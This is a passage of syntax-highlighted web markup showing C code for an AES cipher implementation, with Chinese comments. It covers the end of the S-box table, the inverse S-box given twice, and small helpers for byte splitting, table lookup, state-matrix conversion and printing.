class="hljs-number">0x80</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x75</span>,<br>                               <span class="hljs-number">0x09</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0xb3</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x84</span>,<br>                               <span class="hljs-number">0x53</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xfc</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0xcb</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xcf</span>,<br>                               <span class="hljs-number">0xd0</span>, <span class="hljs-number">0xef</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0xa8</span>,<br>                               <span class="hljs-number">0x51</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0xbc</span>, <span class="hljs-number">0xb6</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0xd2</span>,<br>                               <span class="hljs-number">0xcd</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xec</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0xa7</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x73</span>,<br>                               <span class="hljs-number">0x60</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0xdb</span>,<br>                               <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x3a</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0xac</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0x79</span>,<br>                               <span class="hljs-number">0xe7</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xf4</span>, <span class="hljs-number">0xea</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0x08</span>,<br>                               <span class="hljs-number">0xba</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x8a</span>,<br>                               <span class="hljs-number">0x70</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xb9</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x9e</span>,<br>                               <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xdf</span>,<br>                               <span class="hljs-number">0x8c</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0xb0</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0x16</span> &#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 逆S盒</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> S2[<span class="hljs-number">16</span>][<span class="hljs-number">16</span>] = &#123; <span class="hljs-number">0x52</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0xd7</span>, <span class="hljs-number">0xfb</span>,<br>                                <span class="hljs-number">0x7c</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0xcb</span>,<br>                                <span class="hljs-number">0x54</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xfa</span>, <span class="hljs-number">0xc3</span>, <span class="hljs-number">0x4e</span>,<br>                                <span class="hljs-number">0x08</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0xa2</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0x25</span>,<br>                                <span class="hljs-number">0x72</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xd4</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xb6</span>, <span class="hljs-number">0x92</span>,<br>                                <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0xb9</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xa7</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x84</span>,<br>                                <span class="hljs-number">0x90</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0xab</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0xbc</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0xb3</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x06</span>,<br>                                <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0xca</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0x6b</span>,<br>                                <span class="hljs-number">0x3a</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xea</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xf2</span>, <span class="hljs-number">0xcf</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0x73</span>,<br>                                <span class="hljs-number">0x96</span>, <span class="hljs-number">0xac</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xdf</span>, <span class="hljs-number">0x6e</span>,<br>                                <span class="hljs-number">0x47</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xc5</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0xb7</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x1b</span>,<br>                                <span class="hljs-number">0xfc</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0xd2</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9a</span>, <span class="hljs-number">0xdb</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xcd</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xf4</span>,<br>                                <span class="hljs-number">0x1f</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0xa8</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xec</span>, <span class="hljs-number">0x5f</span>,<br>                                <span class="hljs-number">0x60</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0xef</span>,<br>                                <span class="hljs-number">0xa0</span>, <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0xb0</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x61</span>,<br>                                <span class="hljs-number">0x17</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x7d</span> &#125;;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> S3[] = &#123; <span class="hljs-number">0x52</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0xd7</span>, <span class="hljs-number">0xfb</span>,<br>                                <span class="hljs-number">0x7c</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0xcb</span>,<br>                                <span class="hljs-number">0x54</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xfa</span>, <span class="hljs-number">0xc3</span>, <span class="hljs-number">0x4e</span>,<br>                                <span class="hljs-number">0x08</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0xa2</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0x25</span>,<br>                                <span class="hljs-number">0x72</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xd4</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xb6</span>, <span class="hljs-number">0x92</span>,<br>                                <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0xb9</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xa7</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x84</span>,<br>                                <span class="hljs-number">0x90</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0xab</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0xbc</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0xb3</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x06</span>,<br>                                <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0xca</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0x6b</span>,<br>                                <span class="hljs-number">0x3a</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xea</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xf2</span>, <span class="hljs-number">0xcf</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0x73</span>,<br>                                <span class="hljs-number">0x96</span>, <span class="hljs-number">0xac</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xdf</span>, <span class="hljs-number">0x6e</span>,<br>                                <span class="hljs-number">0x47</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xc5</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0xb7</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x1b</span>,<br>                                <span class="hljs-number">0xfc</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0xd2</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9a</span>, <span class="hljs-number">0xdb</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xcd</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xf4</span>,<br>                                <span class="hljs-number">0x1f</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0xa8</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xec</span>, <span class="hljs-number">0x5f</span>,<br>                                <span class="hljs-number">0x60</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0xef</span>,<br>                                <span class="hljs-number">0xa0</span>, <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0xb0</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x61</span>,<br>                                <span class="hljs-number">0x17</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x7d</span> &#125;;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 获取整形数据的低8位的左4个位</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getLeft4Bit</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> left = num &amp; <span class="hljs-number">0x000000f0</span>;<br>    <span class="hljs-keyword">return</span> left &gt;&gt; <span class="hljs-number">4</span>;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 获取整形数据的低8位的右4个位</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getRight4Bit</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> num &amp; <span class="hljs-number">0x0000000f</span>;<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 根据索引，从S盒中获得元素</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getNumFromSBox</span><span class="hljs-params">(<span class="hljs-keyword">int</span> index)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> row = getLeft4Bit(index);<br>    <span class="hljs-keyword">int</span> col = getRight4Bit(index);<br>    <span class="hljs-keyword">return</span> S[row][col];<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 把一个字符转变成整型</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getIntFromChar</span><span class="hljs-params">(<span class="hljs-keyword">char</span> c)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> result = (<span class="hljs-keyword">int</span>) c;<br>    <span class="hljs-keyword">return</span> result &amp; <span class="hljs-number">0x000000ff</span>;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 把16个字符转变成4X4的数组，</span><br><span class="hljs-comment"> * 该矩阵中字节的排列顺序为从上到下，</span><br><span class="hljs-comment"> * 从左到右依次排列。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">convertToIntArray</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">int</span> pa[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++) &#123;<br>            pa[j][i] = getIntFromChar(str[k]);<br>            k++;<br>        &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 打印4X4的数组</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">printArray</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)&#123;<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x &quot;</span>,  a[i][j]);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 打印字符串的ASSCI，</span><br><span class="hljs-comment"> * 